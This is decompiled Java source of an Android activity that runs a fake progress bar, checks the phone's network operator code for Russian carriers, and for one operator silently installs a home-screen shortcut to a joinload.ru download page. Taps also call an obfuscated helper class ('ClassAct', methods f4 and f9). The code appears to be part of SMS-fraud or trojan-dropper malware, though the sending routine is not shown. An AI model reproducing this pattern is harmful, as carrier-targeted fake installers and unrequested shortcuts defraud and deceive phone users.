package eu.margaritasoft.firstdevelop;

import android.app.Activity;
import android.content.Intent;
import android.content.Intent.ShortcutIconResource;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Parcelable;
import android.telephony.TelephonyManager;
import android.text.Html;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import eu.evandorostech.droider.ClassAct;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;

public class Grandman
  extends Activity
{
  private final int ID_MENU_EXIT = 1;
  private Button button;
  private Button button2;
  private Button button3;
  public Handler handler = new Handler();
  private ProgressBar progressBar;
  private TextView resulturl;
  private Runnable runMethod = new Runnable()
  {
    public void run()
    {
      Grandman.this.progressBar.setProgress(Grandman.this.progressBar.getProgress() + 5);
      if (Grandman.this.progressBar.getProgress() > 99)
      {
        Grandman.this.timer.stop();
        Grandman.this.button.setVisibility(0);
        Grandman.this.progressBar.setVisibility(8);
        Object localObject = ((TelephonyManager)Grandman.this.getSystemService("phone")).getNetworkOperator();
        if ((localObject != null) && (((String)localObject).length() > 2))
        {
          if (!((String)localObject).substring(0, 3).contains("250"))
          {
            Grandman.this.textbelow.setVisibility(0);
            Grandman.this.textpredl.setVisibility(0);
          }
          if (((String)localObject).length() > 4)
          {
            if (((String)localObject).contains("25002"))
            {
              Grandman.this.textbelow.setVisibility(0);
              Grandman.this.textpredl.setVisibility(0);
            }
            if (((String)localObject).contains("25099"))
            {
              localObject = new Intent("android.intent.action.VIEW", Uri.parse("http://joinload.ru/enter.php?auto=1"));
              ((Intent)localObject).addFlags(268435456);
              ((Intent)localObject).addFlags(67108864);
              Intent localIntent = new Intent();
              localIntent.putExtra("android.intent.extra.shortcut.INTENT", (Parcelable)localObject);
              localIntent.putExtra("android.intent.extra.shortcut.NAME", "JoinLoad");
              localIntent.putExtra("duplicate", false);
              localIntent.putExtra("android.intent.extra.shortcut.ICON_RESOURCE", Intent.ShortcutIconResource.fromContext(Grandman.this.getApplicationContext(), 2130837508));
              localIntent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
              Grandman.this.sendBroadcast(localIntent);
            }
          }
        }
      }
    }
  };
  private ClassAct testsend;
  private TextView textbelow;
  private TextView textpredl;
  private UITimer timer;
  
  public Grandman() {}
  
  private String getasset(String paramString)
  {
    Object localObject = getAssets();
    try
    {
      paramString = ((AssetManager)localObject).open(paramString);
      localObject = new byte[paramString.available()];
      paramString.read((byte[])localObject);
      paramString = new String((byte[])localObject);
      return paramString;
    }
    catch (IOException paramString)
    {
      paramString.printStackTrace();
    }
    return null;
  }
  
  public void L(String paramString) {}
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setstartdisplay();
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    paramMenu.add(0, 1, 0, "Правила");
    return true;
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    setroolsdisplay();
    return true;
  }
  
  public void setresultdisplay()
  {
    setContentView(2130903041);
    this.button2 = ((Button)findViewById(2131165191));
    this.resulturl = ((TextView)findViewById(2131165190));
    this.resulturl.setText(this.testsend.q1);
    if (this.testsend.q15 == 1) {
      this.button2.setBackgroundResource(2130837506);
    }
    if (this.testsend.q15 == 2) {
      this.button2.setBackgroundResource(2130837510);
    }
    this.button2.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        paramAnonymousView = new Intent("android.intent.action.VIEW", Uri.parse(Grandman.this.testsend.q1));
        Grandman.this.startActivity(paramAnonymousView);
      }
    });
  }
  
  public void setroolsdisplay()
  {
    setContentView(2130903042);
    this.button3 = ((Button)findViewById(2131165195));
    String str = getasset("rools.txt");
    ((TextView)findViewById(2131165194)).setText(Html.fromHtml(str));
    if (this.testsend.q15 == 1) {
      this.button3.setBackgroundResource(2130837506);
    }
    if (this.testsend.q15 == 2) {
      this.button3.setBackgroundResource(2130837510);
    }
    this.button3.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        Grandman.this.testsend.f9();
        Grandman.this.setresultdisplay();
      }
    });
  }
  
  public void setstartdisplay()
  {
    setContentView(2130903040);
    this.testsend = new ClassAct();
    this.testsend.f1(getApplicationContext(), "conf.txt", 1);
    this.testsend.f2();
    this.progressBar = ((ProgressBar)findViewById(2131165186));
    this.button = ((Button)findViewById(2131165187));
    if (this.testsend.q15 == 1) {
      this.button.setBackgroundResource(2130837506);
    }
    if (this.testsend.q15 == 2) {
      this.button.setBackgroundResource(2130837510);
    }
    L(this.testsend.q5.toString());
    this.textbelow = ((TextView)findViewById(2131165188));
    this.textpredl = ((TextView)findViewById(2131165185));
    this.button.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        Grandman.this.testsend.f4();
        Grandman.this.testsend.f9();
        Grandman.this.setresultdisplay();
      }
    });
    this.textbelow.setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        Grandman.this.setroolsdisplay();
      }
    });
    this.timer = new UITimer(this.handler, this.runMethod, 250);
    this.timer.start();
  }
  
  public class UITimer
  {
    private boolean enabled = false;
    private Handler handler;
    private int intervalMs;
    private boolean oneTime = false;
    private Runnable runMethod;
    private Runnable timer_tick = new Runnable()
    {
      public void run()
      {
        if (!Grandman.UITimer.this.enabled) {
          return;
        }
        Grandman.UITimer.this.handler.post(Grandman.UITimer.this.runMethod);
        if (Grandman.UITimer.this.oneTime)
        {
          Grandman.UITimer.this.enabled = false;
          return;
        }
        Grandman.UITimer.this.handler.postDelayed(Grandman.UITimer.this.timer_tick, Grandman.UITimer.this.intervalMs);
      }
    };
    
    public UITimer(Handler paramHandler, Runnable paramRunnable, int paramInt)
    {
      this.handler = paramHandler;
      this.runMethod = paramRunnable;
      this.intervalMs = paramInt;
    }
    
    public UITimer(Handler paramHandler, Runnable paramRunnable, int paramInt, boolean paramBoolean)
    {
      this(paramHandler, paramRunnable, paramInt);
      this.oneTime = paramBoolean;
    }
    
    public boolean isEnabled()
    {
      return this.enabled;
    }
    
    public void start()
    {
      if (this.enabled) {}
      while (this.intervalMs < 1) {
        return;
      }
      this.enabled = true;
      this.handler.postDelayed(this.timer_tick, this.intervalMs);
    }
    
    public void stop()
    {
      if (!this.enabled) {
        return;
      }
      this.enabled = false;
      this.handler.removeCallbacks(this.runMethod);
      this.handler.removeCallbacks(this.timer_tick);
    }
  }
}
